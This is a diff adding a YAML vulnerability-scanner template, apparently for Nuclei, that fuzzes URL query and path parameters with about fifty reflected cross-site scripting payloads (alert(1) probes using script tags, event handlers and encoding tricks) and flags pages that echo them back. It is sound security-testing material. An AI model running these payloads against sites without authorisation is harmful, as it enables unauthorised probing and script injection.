@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<div draggable=\"true\" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>"
+        - "<del onclick=\"alert(1)\">test</del>"
+        - "<script>alert(1)</script>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>"
+        - "<html id=x tabindex=1 onfocusin=alert(1)></html>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<SCRIPT>alert(88)</SCRIPT>"
+        - "<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>"
+        - "<style>@keyframes x{}</style><source style=\"animation-name:x\" onanimationstart=\"alert(1)\"></source>"
+        - "<iframe draggable=\"true\" ondragend=\"alert(1)\">test</iframe>"
+        - "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>"
+        - "<img src=xxx:x onloadscriptalert=\"javascript:javascript:alert(1)\");>"
+        - "<style>@keyframes x{}</style><time style=\"animation-name:x\" onanimationend=\"alert(1)\"></time>"
+        - "<body id=x tabindex=1 onactivate=alert(1)></body><input autofocus>"
+        - "<video autoplay controls onpause=alert(1)></video>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>"
+        - "<embed onpaste=\"alert(1)\" contenteditable>test</embed>"
+        - "<script>alert(1)</script>"
+        - "<script type=\"text/javascript\">javascript:alert(1)</script>"
+        - "<aside onclick=\"alert(1)\">test</aside>"
+        - "<p onpaste=\"alert(1)\" contenteditable>test</p>"
+        - "<marquee draggable=\"true\" ondragend=\"alert(1)\">test</marquee>"
+        - "<multicol onblur=alert(1) id=x></multicol>"
+        - "<style>:target {transform: rotate(180deg);}</style><time id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></time>"
+        - "<IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<IMG SRC=\"x\" xss:expr"
+        - "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<details id=x tabindex=1 ondeactivate=alert(1)></details><input autofocus>"
+        - "<iframe onblur=alert(1) tabindex=1 id=x></iframe><input autofocus>"
+        - "<menuitem draggable=\"true\" ondragend=\"alert(1)\">test</menuitem>"
+        - "<map id=x tabindex=1 onfocusin=alert(1)></map><input autofocus>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>"
+        - "<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed><input autofocus>"
+        - "<input autofocus>"
+        - "<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>"
+        - "<dl draggable=\"true\" ondragenter=\"alert(1)\">test</dl>"
+        - "<IMG SRC=x onscroll=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>"
+        - "<embed src=\"&lt;svg/onerror='javascript:alert(1)&#39;&gt;//'>&quot;"
+        - "<style>@keyframes x{}</style><progress style=\"animation-name:x\" onanimationstart=\"alert(1)\"></progress>"
+        - "<del onclick=\"alert(1)\">test</del>"
+        - "<embed src=\"&#1;&#20;&#8;#&#0;&#9;&#10;&#11;&#13;javascript:alert(1)\"></embed>"
+        - "<script>alert(1)</script>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<svg draggable=\"true\" ondragleave=\"alert(1)\">test</svg>"
+        - "<del onmousedown=\"alert(1)\">test</del>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
